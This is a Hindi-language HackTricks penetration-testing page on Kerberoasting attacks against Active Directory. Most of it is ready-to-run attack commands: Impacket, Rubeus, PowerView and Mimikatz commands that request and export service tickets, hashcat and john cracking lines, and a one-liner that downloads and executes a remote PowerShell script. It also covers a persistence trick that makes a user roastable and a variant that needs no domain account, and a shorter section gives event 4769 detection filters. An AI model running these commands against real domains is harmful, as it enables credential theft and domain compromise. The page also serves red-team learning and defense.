# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करके आसानी से **वर्कफ्लोज़ का निर्माण और स्वचालन** करें जो दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित होते हैं।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**टेलीग्राम समूह**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपोज़ में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>

## Kerberoast

**Kerberoasting** का उद्देश्य AD में उपयोगकर्ता खातों की ओर से चलने वाली सेवाओं के लिए **TGS टिकटों की फसल** लेना है, कंप्यूटर खातों का नहीं। इस प्रकार, इन TGS **टिकटों का हिस्सा** उपयोगकर्ता के पासवर्ड से निकाले गए **कुंजियों** के साथ **एन्क्रिप्टेड** होता है। परिणामस्वरूप, उनकी साखों को **ऑफलाइन क्रैक** किया जा सकता है।\
आप जान सकते हैं कि एक **उपयोगकर्ता खाता** एक **सेवा** के रूप में उपयोग किया जा रहा है क्योंकि संपत्ति **"ServicePrincipalName"** **शून्य नहीं है**।

इसलिए, Kerberoasting करने के लिए, केवल एक डोमेन खाता जरूरी है जो TGSs के लिए अनुरोध कर सकता है, जो कोई भी हो सकता है क्योंकि कोई विशेष विशेषाधिकार आवश्यक नहीं हैं।

**आपको डोमेन के अंदर मान्य साखों की आवश्यकता है।**

### **हमला**

{% hint style="warning" %}
**Kerberoasting उपकरण** आमतौर पर हमला करते समय और TGS-REQ अनुरोधों को शुरू करते समय **`RC4 एन्क्रिप्शन`** का अनुरोध करते हैं। यह इसलिए है क्योंकि **RC4** [**कमजोर**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) है और Hashcat जैसे उपकरणों का उपयोग करके ऑफलाइन क्रैक करना अन्य एन्क्रिप्शन एल्गोरिदम जैसे AES-128 और AES-256 की तुलना में आसान है।\
RC4 (प्रकार 23) हैश **`$krb5tgs$23$*`** से शुरू होते हैं जबकि AES-256(प्रकार 18) **`$krb5tgs$18$*`** से।`
{% endhint %}

#### **लिनक्स**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
बहु-सुविधा उपकरण जिसमें kerberoastable उपयोगकर्ताओं का डंप शामिल है:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Kerberoastable उपयोगकर्ताओं की सूची बनाएं**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **तकनीक 1: TGS के लिए अनुरोध करें और इसे मेमोरी से डंप करें**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **तकनीक 2: स्वचालित उपकरण**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
जब TGS का अनुरोध किया जाता है, Windows इवेंट `4769 - A Kerberos service ticket was requested` उत्पन्न होता है।
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करके आसानी से **workflows को बनाएं और स्वचालित करें** जो दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित होते हैं।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Cracking
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### स्थायित्व

यदि आपके पास किसी उपयोगकर्ता पर **पर्याप्त अनुमतियां** हैं, तो आप उसे **kerberoastable बना सकते हैं**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
आप **kerberoast** हमलों के लिए उपयोगी **उपकरण** यहाँ पा सकते हैं: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

यदि आपको Linux से यह **एरर** मिलता है: **`Kerberos SessionError: KRB_AP_ERR_SKEW(घड़ी का अंतर बहुत अधिक है)`** तो यह आपके स्थानीय समय के कारण है, आपको होस्ट को DC के साथ समकालिक करने की आवश्यकता है। कुछ विकल्प हैं:

* `ntpdate <DC का IP>` - Ubuntu 16.04 के रूप में Deprecated
* `rdate -n <DC का IP>`

### निवारण

Kerberoast बहुत चुपके से होता है यदि इसका शोषण किया जा सकता है

* सुरक्षा इवेंट ID 4769 – एक Kerberos टिकट का अनुरोध किया गया था
* चूंकि 4769 बहुत आम है, आइए परिणामों को फ़िल्टर करें:
* सेवा का नाम krbtgt नहीं होना चाहिए
* सेवा का नाम $ से समाप्त नहीं होना चाहिए (सेवाओं के लिए इस्तेमाल किए गए मशीन खातों को फ़िल्टर करने के लिए)
* खाते का नाम मशीन@डोमेन नहीं होना चाहिए (मशीनों से अनुरोधों को फ़िल्टर करने के लिए)
* विफलता कोड '0x0' होना चाहिए (विफलताओं को फ़िल्टर करने के लिए, 0x0 सफलता है)
* सबसे महत्वपूर्ण, टिकट एन्क्रिप्शन प्रकार 0x17 है
* निवारण:
* सेवा खाता पासवर्ड अनुमान लगाने में कठिन होना चाहिए (25 अक्षरों से अधिक)
* प्रबंधित सेवा खातों का उपयोग करें (पासवर्ड का स्वचालित रूप से परिवर्तन और SPN प्रबंधन का प्रतिनिधित्व)
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
## Kerberoast बिना डोमेन अकाउंट के

सितंबर 2022 में [Charlie Clark](https://exploit.ph/) द्वारा एक सुरक्षा दोष की खोज की गई, ST (Service Tickets) को KRB\_AS\_REQ अनुरोध के माध्यम से प्राप्त किया जा सकता है बिना किसी Active Directory अकाउंट के नियंत्रण के। यदि कोई प्रिंसिपल प्री-प्रमाणीकरण के बिना प्रमाणित कर सकता है (जैसे AS-REP Roasting हमला), तो इसका उपयोग **KRB\_AS\_REQ** अनुरोध लॉन्च करने के लिए किया जा सकता है और अनुरोध को चालाकी से **ST** के लिए पूछने के लिए बनाया जा सकता है बजाय **encrypted TGT** के, अनुरोध के req-body भाग में **sname** विशेषता को संशोधित करके।

इस तकनीक की पूरी व्याख्या इस लेख में की गई है: [Semperis ब्लॉग पोस्ट](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
आपको उपयोगकर्ताओं की एक सूची प्रदान करनी होगी क्योंकि हमारे पास इस तकनीक का उपयोग करके LDAP क्वेरी करने के लिए एक मान्य अकाउंट नहीं है।
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus से PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
**ired.team में Kerberoasting के बारे में अधिक जानकारी** [**यहाँ**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)**और** [**यहाँ**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**पर प्राप्त करें।**

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**।**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) का उपयोग करके दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित **वर्कफ्लो को आसानी से बनाएं और स्वचालित करें**।\
आज ही एक्सेस प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
